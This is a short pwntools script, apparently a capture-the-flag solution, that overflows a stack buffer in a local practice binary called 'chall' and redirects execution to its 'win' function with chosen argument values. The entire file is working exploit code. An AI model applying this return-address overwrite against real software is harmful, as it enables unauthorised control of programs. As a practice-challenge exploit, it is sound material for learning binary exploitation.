#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
# break main
b* 0x080491c8
b* 0x080491d1
c
'''.format(**locals())

io = start()

payload = flat({
    28: [
            exe.sym.win,
            cyclic(4),
            0xdeadbeef,
            0xcafebabe
    ]
})

io.sendline(payload)

io.interactive()

